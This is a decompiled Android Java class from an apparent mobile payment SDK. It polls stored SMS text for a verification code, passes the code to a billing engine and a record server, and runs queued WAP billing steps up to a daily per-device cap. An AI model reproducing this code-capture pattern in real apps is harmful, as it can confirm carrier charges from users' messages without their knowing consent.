package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import com.zhangzhifu.sdk.ZhangPayCallback;
import com.zhangzhifu.sdk.ZhangPayEngine;
import com.zhangzhifu.sdk.ZhangPayRecodeServer;
import com.zhangzhifu.sdk.db.PcOnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.PcOnlineProcedure;
import com.zhangzhifu.sdk.modle.PcOnlineWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.MsgResponse_pc;
import com.zhangzhifu.sdk.util.sms.util.SmsAuthCode;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class ZhangPayPCOF
{
  private static ZhangPayPCOF aN;
  public static int allFlow;
  public static String currentWapUrl;
  private PcOnlineProcedure aO;
  private MsgResponse_pc aP;
  private Context ao;
  private String aq;
  public String contentsid;
  public int count;
  public boolean isSend = false;
  public boolean isSendNext = false;
  private Map map = new HashMap();
  public String smsBody = null;
  public String smsCode = null;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayPCOF(Context paramContext)
  {
    this.ao = paramContext;
  }
  
  private void a(Context paramContext)
  {
    SharePreferUtil.getInstance();
    SharePreferUtil.setSmsBody(paramContext, null);
    SharePreferUtil.getInstance().setAuthCode(paramContext, null);
    int i = 0;
    for (;;)
    {
      if (i >= 120) {
        return;
      }
      try
      {
        Thread.sleep(500L);
        if (b(paramContext) != null)
        {
          this.smsBody = b(paramContext);
          this.smsCode = SmsAuthCode.getDynamicPassword(paramContext, this.smsBody);
          System.out.println("最终的验证码---》" + this.smsCode);
          SharePreferUtil.getInstance().setSmsResult(paramContext, 1001);
          ZhangPayEngine.getInstance().sendMsg(2);
          ZhangPayRecodeServer localZhangPayRecodeServer = ZhangPayRecodeServer.getInstance();
          SharePreferUtil.getInstance();
          localZhangPayRecodeServer.sentMessServer(paramContext, SharePreferUtil.getPriciePointId(paramContext), 1001);
          return;
        }
      }
      catch (InterruptedException paramContext)
      {
        System.out.println("获取验证码异常，请允许查看收件箱");
        paramContext.printStackTrace();
        return;
      }
      i += 1;
    }
  }
  
  private static String b(Context paramContext)
  {
    try
    {
      SharePreferUtil.getInstance();
      if (SharePreferUtil.getSmsBody(paramContext) != null)
      {
        SharePreferUtil.getInstance();
        if (SharePreferUtil.getSmsBody(paramContext).equals("")) {
          return null;
        }
        SharePreferUtil.getInstance();
        paramContext = SharePreferUtil.getSmsBody(paramContext);
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  public static ZhangPayPCOF getInstance(Context paramContext)
  {
    if (aN == null) {
      aN = new ZhangPayPCOF(paramContext);
    }
    return aN;
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      PcOnlineWap localPcOnlineWap = (PcOnlineWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.ao)) {
        break;
      }
      if (localPcOnlineWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localPcOnlineWap.getAllProcedure() != null) && (localPcOnlineWap.getAllProcedure().size() != 0))
      {
        new i(this, localPcOnlineWap).execute(new String[] { "" });
        PcOnlineGameWapDBManager.getInstance().delWapById(this.ao, localPcOnlineWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.ao, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
}
